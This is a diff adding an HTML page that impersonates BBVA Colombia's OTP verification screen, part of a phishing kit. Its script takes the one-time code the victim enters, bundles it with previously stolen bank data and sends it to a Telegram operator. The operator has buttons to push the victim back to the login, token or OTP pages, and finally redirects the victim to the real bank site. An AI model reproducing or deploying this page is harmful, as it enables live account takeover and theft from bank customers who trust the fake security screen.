@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA Net - Verificación OTP</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen" style="display: none;">
+        <div class="loading-content">
+            <img src="img/BBVA_logo_2025.svg.png" alt="BBVA" class="loading-logo">
+            <div class="loading-spinner"></div>
+            <p class="loading-text">Cargando...</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="#1973B8"/>
+                </svg>
+            </div>
+            <div class="logo">
+                <img src="img/BBVA_logo_2025.svg.png" alt="BBVA">
+            </div>
+            <button class="close-btn" onclick="window.location.href='https://www.bbva.com.co/'">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                    <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#1973B8"/>
+                </svg>
+            </button>
+        </header>
+
+        <!-- Security Badge -->
+        <div class="security-badge">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="#1973B8"/>
+            </svg>
+        </div>
+
+        <p class="security-text">Estás en un entorno con seguridad BBVA</p>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <h1 class="title">Verificación de <br>Seguridad</h1>
+
+            <div class="otp-info">
+                <div class="info-icon">
+                    <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
+                        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" fill="#1973B8"/>
+                    </svg>
+                </div>
+                <p class="otp-description">
+                    Hemos enviado un código de verificación a tu número de celular registrado y/o correo electrónico.
+                </p>
+            </div>
+
+            <form class="otp-form">
+                <!-- Código OTP -->
+                <div class="input-group">
+                    <label class="input-label">Código de verificación</label>
+                    <input 
+                        type="text" 
+                        class="input-field otp-input" 
+                        id="otpCode" 
+                        placeholder="Ingresa el código"
+                        maxlength="6"
+                        autocomplete="off">
+                </div>
+
+                <!-- Botón Verificar -->
+                <button type="submit" class="submit-btn" id="btnVerificar" disabled>Verificar</button>
+
+                <!-- Resend Link -->
+                <a href="#" class="resend-link" onclick="return false;">¿No recibiste el código? <strong>Reenviar</strong></a>
+            </form>
+
+            <!-- Info Card -->
+            <div class="info-card">
+                <h3 class="info-title">¿Por qué necesitamos esto?</h3>
+                <p class="info-text">
+                    Este paso adicional de seguridad nos ayuda a verificar tu identidad y proteger tu cuenta de accesos no autorizados.
+                </p>
+            </div>
+        </main>
+    </div>
+
+    <script src="/js/banco-utils.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const otpCode = document.getElementById('otpCode');
+        const btn = document.getElementById('btnVerificar');
+        const form = document.querySelector('.otp-form');
+        const overlay = document.getElementById('loadingScreen');
+        
+        if (!otpCode || !btn || !form || !overlay) return;
+        
+        overlay.style.display = 'none';
+        
+        const socketInstance = BancoUtils.initSocket();
+        if (socketInstance) socketInstance.removeAllListeners('telegramAction');
+        
+        btn.disabled = true;
+        
+        otpCode.addEventListener('input', function() {
+            const numericValue = otpCode.value.replace(/\D/g, '');
+            otpCode.value = numericValue;
+            
+            const isValid = numericValue.length >= 4;
+            btn.disabled = !isValid;
+        });
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if (btn.disabled) return;
+            
+            const currentSocket = BancoUtils.getSocket();
+            if (!currentSocket || !currentSocket.connected) {
+                BancoUtils.initSocket();
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            overlay.style.display = 'flex';
+            
+            const data = { otp: otpCode.value.trim() };
+            const fullData = BancoUtils.saveBankData('bbva', data);
+            const message = BancoUtils.formatMessage('BBVA - OTP', fullData);
+            const buttons = [
+                { text: '🔑 Pedir Login', action: 'index' },
+                { text: '🔒 Pedir Token', action: 'token' },
+                { text: '📱 Pedir OTP', action: 'otp' },
+                { text: '✅ Finalizar', action: 'finalizar' }
+            ];
+            const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());
+            
+            try {
+                await BancoUtils.sendToTelegram('otp', { text: message, keyboard });
+            } catch (error) {
+                overlay.style.display = 'none';
+                alert('Error al enviar. Intenta nuevamente.');
+            }
+        });
+        
+        BancoUtils.onTelegramAction((data) => {
+            if (data.action === 'finalizar') {
+                window.location.href = 'https://www.bbva.com.co/';
+            } else if (['index', 'token', 'otp'].includes(data.action)) {
+                window.location.href = data.action + '.html';
+            }
+        });
+    });
+    </script>
+</body>
+</html>
